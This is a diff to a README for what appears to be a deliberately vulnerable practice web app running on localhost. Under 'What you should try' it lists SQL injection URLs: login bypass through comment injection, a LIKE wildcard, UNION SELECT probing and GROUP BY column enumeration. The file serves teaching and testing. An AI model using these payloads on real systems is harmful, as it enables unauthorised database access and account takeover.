@@ -46,10 +46,16 @@ http://localhost:3000/getUser/
 <br>
 http://localhost:3000/login/Admin&1234567
 
-###What you should try
+### What you should try
 
 http://localhost:3000/getUser/1'--%20
 
 http://localhost:3000/login/admin'--%20&1234567
 
 http://localhost:3000/loginLike/Admin&%25
+
+http://localhost:3000/getUserInfo/1'%20UNION%20SELECT%201,2,3%20--%20'
+
+http://localhost:3000/getUserInfo/1'%20GROUP%20BY%205%20--%20'
+http://localhost:3000/getUserInfo/1'%20GROUP%20BY%204%20--%20'
+http://localhost:3000/getUserInfo/1'%20GROUP%20BY%203%20--%20'
